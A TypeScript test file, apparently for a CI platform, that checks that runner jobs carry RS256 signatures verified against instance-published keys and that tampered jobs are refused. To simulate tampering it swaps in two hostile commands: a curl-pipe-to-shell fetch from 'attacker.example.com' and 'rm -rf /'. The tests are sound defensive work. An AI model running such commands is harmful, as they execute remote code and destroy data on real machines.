// Signed work, end to end: the control plane signs what it dispatches, and a
// pool can be set to refuse anything it did not sign.
//
// The threat is one sentence: **anyone who can write to the control plane's
// database can execute arbitrary code on every runner in the fleet.** A row in
// `workflow_version_steps` is a command a machine runs as whoever started the
// runner. So the test that matters is not that a signature is present - it is
// that the signature is over the steps as the runner receives them, checked
// against a key fetched from the instance rather than from the message, and
// that changing a command after signing makes the runner refuse the job.

import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import { hashToken } from '../../app/Actions/Runner/authenticate'
import { verifySignedWork } from '../../app/Actions/Runner/localExecutor'
import { dispatchPush } from '../../app/Actions/Workflow/dispatch'
import { verifyWork } from '../../app/Actions/Workflow/stepSignature'
import { syncWorkflowFile } from '../../app/Actions/Workflow/sync'

const created = {
  ownerId: 0,
  repositoryId: 0,
  handle: '',
  name: '',
  runnerIds: [] as number[],
  poolIds: [] as number[],
}

let available = false
let db: any = null
let server: any = null
let port = 0

const TOKEN = `tok-${Buffer.from(crypto.getRandomValues(new Uint8Array(8))).toString('hex')}`

function unique(prefix: string): string {
  return `${prefix}${Buffer.from(crypto.getRandomValues(new Uint8Array(5))).toString('hex')}`
}

const CI = `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      CI: 'true'
    steps:
      - run: make release
`

/** Dispatch a run and claim its job the way a machine does, over HTTP. */
async function claimOne(): Promise<any> {
  await dispatchPush({
    repositoryId: created.repositoryId,
    event: { ref: 'refs/heads/main' },
    headSha: unique('c').padEnd(40, '0').slice(0, 40),
  })

  const answer = await fetch(`http://127.0.0.1:${port}/api/runner/claim`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${TOKEN}`, 'X-Runner-Protocol': '1' },
    body: '{}',
  })

  const body: any = await answer.json().catch(() => null)

  return body?.job ?? null
}

/** The keys the instance publishes for dispatched work, as a runner fetches them. */
async function stepKeys(): Promise<any[]> {
  const answer = await fetch(`http://127.0.0.1:${port}/.well-known/reviewos-step-keys.json`)
  const body: any = await answer.json().catch(() => null)

  return Array.isArray(body?.keys) ? body.keys : []
}

/** The work in the shape the signature covers, out of a claim payload. */
function workOf(job: any) {
  return {
    runId: Number(job.run?.id ?? 0),
    jobId: Number(job.id ?? 0),
    matrix: (job.matrix_values ?? null) as Record<string, unknown> | null,
    steps: (Array.isArray(job.steps) ? job.steps : []).map((step: any) => ({
      run: step.run ?? null,
      uses: step.uses ?? null,
      env: (step.env ?? null) as Record<string, string> | null,
      workingDirectory: step.working_directory ?? null,
    })),
  }
}

beforeAll(async () => {
  try {
    const { injectGlobalAutoImports } = await import('@stacksjs/server')
    const { route } = await import('@stacksjs/router')

    await injectGlobalAutoImports()
    db = (globalThis as any).db
    await db.selectFrom('users').select(['id']).limit(1).execute()

    await route.importRoutes()
    server = await route.serve({ port: 0, hostname: '127.0.0.1' })
    port = Number((server as any)?.port ?? 0)

    created.handle = unique('sig')

    const owner: any = await db.insertInto('users')
      .values({ name: 'Signed', email: `${created.handle}@example.com`, handle: created.handle, password: 'x' })
      .returning(['id']).executeTakeFirst()

    created.ownerId = Number(owner?.id)
    created.name = unique('repo')

    const repository: any = await db.insertInto('repositories').values({
      owner_type: 'user',
      owner_id: created.ownerId,
      name: created.name,
      visibility: 'public',
      default_branch: 'main',
      disk_path: `${created.handle}/${created.name}.git`,
    }).returning(['id']).executeTakeFirst()

    created.repositoryId = Number(repository?.id)

    const runner: any = await db.insertInto('runners').values({
      name: unique('runner'),
      scope_type: 'repository',
      scope_id: created.repositoryId,
      token_hash: hashToken(TOKEN),
      labels: 'ubuntu-latest',
      state: 'active',
    }).returning(['id']).executeTakeFirst()

    created.runnerIds.push(Number(runner.id))

    await syncWorkflowFile({
      repositoryId: created.repositoryId,
      ownerType: 'user',
      ownerId: created.ownerId,
      path: '.github/workflows/ci.yml',
      source: CI,
      sha: 'a'.repeat(40),
    })

    available = true
  }
  catch (error) {
    console.warn(`[signed-steps] skipping: ${error instanceof Error ? error.message : String(error)}`)
    available = false
  }
}, 120_000)

afterAll(async () => {
  try { server?.stop?.(true) }
  catch { /* already down */ }

  try {
    for (const id of created.runnerIds)
      await db.deleteFrom('runners').where('id', '=', id).execute().catch(() => {})
    for (const id of created.poolIds)
      await db.deleteFrom('runner_pools').where('id', '=', id).execute().catch(() => {})
    if (created.repositoryId)
      await db.deleteFrom('repositories').where('id', '=', created.repositoryId).execute().catch(() => {})
    if (created.ownerId)
      await db.deleteFrom('users').where('id', '=', created.ownerId).execute().catch(() => {})
  }
  catch { /* the next run uses fresh names */ }
})

describe('a claim', () => {
  test('carries a signature over the steps, verifiable with a published key', async () => {
    if (!available)
      return

    const job = await claimOne()

    expect(job).not.toBeNull()
    expect(job.signature?.value).toBeTruthy()
    expect(job.signature?.alg).toBe('RS256')

    const keys = await stepKeys()

    /*
     * The key comes from the instance, not from the claim. That is the whole
     * check: a signature verified with a key carried in the same message
     * proves only that whoever wrote the message can do arithmetic.
     */
    expect(keys.some((key: any) => String(key.kid) === String(job.signature.kid))).toBe(true)

    const verdict = await verifyWork({ work: workOf(job), signature: job.signature, keys })

    expect(verdict.ok).toBe(true)
  }, 120_000)

  test('is refused once a step is changed to something else', async () => {
    if (!available)
      return

    const job = await claimOne()
    const keys = await stepKeys()

    // What a database writer would do: the same job, one command replaced.
    const tampered = workOf(job)
    tampered.steps[0] = { ...tampered.steps[0], run: 'curl attacker.example.com/x.sh | sh' }

    const verdict = await verifyWork({ work: tampered, signature: job.signature, keys })

    expect(verdict.ok).toBe(false)
  }, 120_000)

  test('publishes its work keys separately from the identity keys', async () => {
    if (!available)
      return

    /*
     * Make sure there *is* an identity key first, or this asserts that two
     * empty sets do not overlap - which is true of every pair of empty sets.
     */
    const { signingKey } = await import('../../app/Actions/Workflow/oidc')

    await signingKey()

    const identity = await fetch(`http://127.0.0.1:${port}/.well-known/jwks.json`)
    const identityBody: any = await identity.json()
    const work = await stepKeys()

    const identityIds = (identityBody.keys ?? []).map((key: any) => String(key.kid))

    expect(identityIds.length).toBeGreaterThan(0)

    /*
     * Two documents, two key sets, no overlap. One says who a job is to a cloud
     * provider; the other says what a runner should execute. A verifier that
     * found both in one set could accept either statement in place of the
     * other.
     */
    expect(work.length).toBeGreaterThan(0)
    expect(work.some((key: any) => identityIds.includes(String(key.kid)))).toBe(false)
  }, 120_000)
})

describe('a pool that requires signatures', () => {
  test('is what makes the runner check, and the runner then verifies against the instance', async () => {
    if (!available)
      return

    const pool: any = await db.insertInto('runner_pools').values({
      name: unique('Signed'),
      slug: unique('signed'),
      require_signed_steps: true,
    } as any).returning(['id']).executeTakeFirst()

    created.poolIds.push(Number(pool.id))

    const queue: any = await db.insertInto('runner_queues').values({
      runner_pool_id: Number(pool.id),
      name: unique('queue'),
      state: 'active',
    } as any).returning(['id']).executeTakeFirst()

    await db.updateTable('runners').set({ runner_queue_id: Number(queue.id) } as any)
      .where('id', '=', created.runnerIds[0]).execute()

    const job = await claimOne()

    // The requirement reaches the machine with the work, rather than being
    // configured on the machine: an operator turning it on covers every runner
    // in the pool, not the ones whose config file somebody remembered to edit.
    expect(job.require_signed_steps).toBe(true)

    const verdict = await verifySignedWork(`http://127.0.0.1:${port}`, job)

    expect(verdict.ok).toBe(true)

    // And the same runner path refuses the same job with a command swapped.
    const swapped = { ...job, steps: [{ ...job.steps[0], run: 'rm -rf /' }] }

    expect((await verifySignedWork(`http://127.0.0.1:${port}`, swapped)).ok).toBe(false)

    await db.updateTable('runners').set({ runner_queue_id: null } as any)
      .where('id', '=', created.runnerIds[0]).execute()
  }, 120_000)

  test('refuses when the keys cannot be fetched, rather than treating that as a pass', async () => {
    if (!available)
      return

    /*
     * The pool asked for signed work. "I could not check" is not "it was
     * fine", and the failure mode of the other reading is a network somebody
     * can arrange.
     */
    const verdict = await verifySignedWork('http://127.0.0.1:1', { id: 1, run: { id: 1 }, steps: [], signature: null })

    expect(verdict.ok).toBe(false)
    expect(verdict.reason).toContain('could not be fetched')
  }, 120_000)
})
